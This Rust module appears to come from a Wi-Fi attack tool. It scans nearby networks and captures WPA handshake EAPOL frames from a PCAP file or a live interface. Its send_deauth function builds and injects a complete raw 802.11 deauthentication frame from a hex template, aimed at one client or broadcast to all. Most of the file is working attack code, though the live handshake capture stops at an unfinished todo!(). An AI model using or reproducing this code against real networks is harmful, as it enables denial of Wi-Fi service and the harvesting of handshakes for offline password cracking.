//! # wpa
//! Wi-Fi Protected Access (WPA) is a security certification program developed 
//! by the Wi-Fi Alliance to secure wireless devices networks.
//! 
//! `wpa` contains functions of the tool that are responsible for capturing relevant 
//! information from the handshake stage, collect information about near-by networks, 
//! and send de-authentication to other BSSIDs.
use std::io::Result;
use handshake::EapolMsg;
use libwifi::Frame;
use std::io::Error;
use hex::FromHex;

use pcap;
use wlan;

mod network_info;
mod handshake;
mod attack_info;
mod consts;

use consts::*;

pub use attack_info::AttackInfo;
pub use handshake::Handshake;
pub use network_info::{
    ParsedFrame,
    NetworkInfo,
    Client,
    FrameType
};



// --------------------------- Public Functions -------------------------------


/// Capture a handshake from a PCAP file
/// ## Description 
/// The function receives interface, PCAP file, ssid and bssid and scans for 4 EAPOL 
/// packets of the given station and client. Then extract the relevant data from each 
/// packet (A Nonce, B Nonce, MIC, MIC message), and returns it as a struct.
/// ## Example
/// **Basic usage:**
/// ```
///     let pcap: Result<pcap::Capture<pcap::Offline>, pcap::Error> =
///                                       pcap::Capture::from_file("pcap_file.pcap");
///     let handshake = wpa::get_hs_from_file(pcap.unwrap(), "test", "AABBCCDDEEFF");
/// ```
pub fn get_hs_from_file(mut pcap: pcap::Capture<pcap::Offline>,ssid: &str, bssid: &str) -> std::io::Result<Handshake> {
    let mut hs_msgs: [Option<EapolMsg>; 4] = Default::default();
    loop { //TODO: replace with timeout
        let frame;
        match pcap.next_packet() { //listen for the next frame 
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout TODO: timeout check could be checked here
        }

        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize;
        //parse the 802.11 frame
        let parsed_frame = libwifi::parse_frame(&frame[frame_offset..]);
        if parsed_frame.is_err() {
            continue; //TODO: check what gets here
        }

        //filter only QoS Data frames
        if let Frame::QosData(qos) = parsed_frame.unwrap() {
            // check if msg type is EAPOL
            if let Ok(eapol) = EapolMsg::try_from(qos){
                let msg_nu = match eapol.msg_nu{
                    EAPOL_MSG_1 => 1,
                    EAPOL_MSG_2 => 2,
                    EAPOL_MSG_3 => 3,
                    EAPOL_MSG_4 => 4,
                    _ => panic!()
                };
                if hs_msgs[msg_nu -1].is_none(){
                    hs_msgs[msg_nu -1] = Some(eapol);
                }
            }

            if hs_msgs.iter().all(|m|m.is_some()){
                return Ok(Handshake::new(ssid,hs_msgs));
            }
        }
    }
}

/// Capture a handshake while listening
/// ## Description 
/// The function receives interface, ssid and bssid and listens until capturing 4 EAPOL 
/// packets of the given station and client. Then extract the relevant data from each 
/// packet (A Nonce, B Nonce, MIC, MIC message), and returns it as a struct.
/// ## Example
/// **Basic usage:**
/// ```
///     let handshake = wpa::get_hs("wlan0", "test", "AABBCCDDEEFF");
/// ```
pub fn get_hs(iface: &str,ssid: &str, bssid: &str) -> std::io::Result<Handshake> {
    // get recv channel to the interface
    let mut rx = wlan::get_recv_channel(iface)?;
    let mut hs_msgs: [Option<libwifi::frame::QosData>; 4] = Default::default();
    loop { //TODO: replace with timeout
        let frame;
        match rx.next() { //listen for the next frame 
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout TODO: timeout check could be checked here
        }
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize;
        //parse the 802.11 frame
        let parsed_frame = libwifi::parse_frame(&frame[frame_offset..]);
        if parsed_frame.is_err() {
            continue; //TODO: check what gets here
        }

        //filter only QoS Data frames
        if let Frame::QosData(qos) = parsed_frame.unwrap() {
            // check if msg type is EAPOL
            let msg_type: u16 = ((qos.data[EAPOL_CODE_OFFSET] as u16) << 8) | qos.data[EAPOL_CODE_OFFSET+1] as u16;
            if msg_type == EAPOL_TAG_ID {// EAPOL
                // get hs message number
                let msg_num: u16 = ((qos.data[EAPOL_MSG_NUM_OFFSET] as u16) << 8) | qos.data[EAPOL_MSG_NUM_OFFSET+1] as u16;
                match msg_num {
                    EAPOL_MSG_1 =>{
                        // check the bssid
                        if hex::encode(qos.header.address_3.0) == bssid{
                            hs_msgs[0] = Some(qos);
                        }
                    },

                    EAPOL_MSG_2 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[0].is_some() {
                            hs_msgs[1] = Some(qos);
                        }
                    },
                    EAPOL_MSG_3 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[1].is_some() {
                            hs_msgs[2] = Some(qos);
                        }
                    },

                    EAPOL_MSG_4 =>{
                        if hex::encode(qos.header.address_3.0) == bssid && hs_msgs[2].is_some() {
                            hs_msgs[3] = Some(qos);
                        }
                    },

                    _ => {todo!();} //TODO: handle error with parsing
                }
                if hs_msgs.iter().all(|m|m.is_some()){
                    //TODO: FIX ME!
                    todo!();
                    //return Ok(Handshake::new(ssid,hs_msgs));
                }
            }
        }
    }
}

/// Send de-auth to a specific client or broadcast from a given station
/// ## Description
/// The functions receives interface, BSSID of a station and a target's BSSID.
/// The interface sends De-authentication packet from a given BSSID
/// to a specific client or broadcast if terget is None.
/// ## Example
/// **Basic usage:**
/// ```
///     let client: String = "FFEEDDCCBBAA".to_string();
///     // send de-auth from station AA:BB:CC:DD:EE:FF to client FF:EE:DD:CC:BB:AA
///     wpa::send_deauth("wlan1", "AABBCCDDEEFF", Some(client));
///     // will be sent broadcast
///     wpa::send_deauth("wlan1", "AABBCCDDEEFF", None);
/// ```
pub fn send_deauth(iface: &str, bssid: &str, target: Option<String>) -> std::io::Result<()>{
    // get a sender channel to the iface
    let mut tx = wlan::get_send_channel(iface)?;
    
    let target = target.as_deref().unwrap_or("ffffffffffff");// if None, broadcast

    //build the frame
    let radiotap_header = Vec::from_hex("00000c000480000002001800").unwrap();
    let deauth_msg = Vec::from_hex(format!("c0003a01{target}{bssid}{bssid}00000700")).unwrap();  //TODO:replay for debugging

    let frame = &[radiotap_header,deauth_msg].concat()[..];
    // send
    let iface = wlan::get_interface(iface).ok_or(Error::last_os_error())?;
    tx.send_to(frame,Some(iface)).unwrap().unwrap();
    Ok(())
}

/// Collects information about near-by networks and devices
/// ## Description
/// The functions receives interface and time interval that specifies how 
/// much time to listen, and scans for networks and devices. It parses 
/// every packet and saves the relevant information about the network such 
/// as SSID, BSSID, signal strength and channel. If the network is already 
/// familier, it updates the information.
/// The function stops after the given time and returns a HashMap of all 
/// the near-by networks.
/// ## Example
/// **Basic usage:**
/// ```
///     let stations = wpa::listen_and_collect("wlan0", std::time::Duration::from_secs(60));
/// ```
pub fn listen_and_collect(iface: &str, interval: std::time::Duration) -> Result<Vec<ParsedFrame>> {

    let mut networks : Vec<ParsedFrame> = vec![];
    let current_channel = wlan::get_iface_channel(iface)?;

    // get rx channel to the given interface
    let mut rx = wlan::get_recv_channel(iface)?;
    //read time 
    let init_time = std::time::Instant::now();

    while init_time.elapsed() <= interval {

        let frame;
        //try to read next frame
        match rx.next() {
            Ok(data) => {
                frame = data;
            }
            _ => {
                continue;
            } //timeout
        }
        
        //parse frame
        let parsed_frame;
        let frame_offset = frame[FRAME_HEADER_LENGTH] as usize; 
        if frame_offset < frame.len(){
            parsed_frame = libwifi::parse_frame(&frame[frame_offset..]);
        }else{
            parsed_frame = Err(libwifi::error::Error::UnhandledProtocol("unknown message".to_owned()));
        }

        if parsed_frame.is_err() {continue;} //TODO: try to parse better. might be other versions beside WPA2

        // extract data
        let signal = frame[SIGNAL_POS] as i8; //extract signal
        let parsed_frame = parsed_frame.unwrap();
        let msg: std::result::Result<ParsedFrame,&str> = parsed_frame.clone().try_into();
        if let Ok(msg) = msg{
                match msg{
                    ParsedFrame::Network(network)=>{
                        let mut network = network.clone();
                        match  parsed_frame{
                            Frame::Beacon(_) => network.frame_type = Some(FrameType::Beacon),
                            Frame::Data(_) => network.frame_type = Some(FrameType::Data),
                            Frame::QosData(_)=> network.frame_type = Some(FrameType::QosData),
                            Frame::QosNull(_)=> network.frame_type = Some(FrameType::QosNull),
                            Frame::ProbeRequest(_)=> network.frame_type = Some(FrameType::ProbeRequest),
                            Frame::ProbeResponse(_)=> network.frame_type = Some(FrameType::ProbeResponse),
                            Frame::AssociationRequest(_)=> network.frame_type = Some(FrameType::AssociationRequest),
                            Frame::AssociationResponse(_)=> network.frame_type = Some(FrameType::AssociationResponse),
                            _=> network.frame_type = Some(FrameType::Unknown),
                        }
                        network.channel = Some(current_channel);
                        network.signal_strength = Some(signal);
                        network.clients.iter_mut().for_each(|e|{e.channel = current_channel});
                        networks.push(ParsedFrame::Network(network));
                    },
                    ParsedFrame::Eapol(mut eapol)=>{
                        eapol.channel = current_channel;
                        networks.push(ParsedFrame::Eapol(eapol)) 
                    },
                }
        } else{
            continue;
        }
    }
    Ok(networks)
}




